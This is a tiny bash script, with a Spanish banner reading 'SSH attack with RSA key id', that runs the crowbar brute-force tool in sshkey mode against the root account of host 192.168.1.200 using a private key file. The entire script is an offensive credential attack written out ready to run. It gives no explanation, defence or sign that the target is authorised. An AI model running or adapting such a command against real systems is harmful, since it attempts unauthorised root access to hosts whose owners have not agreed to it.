#!/bin/bash
cat << "INFO"
Ataque ssh con id clave rsa
INFO
echo
echo
crowbar -b sshkey -s 192.168.1.200/32 -u root -k /root/.ssh/id_rsa
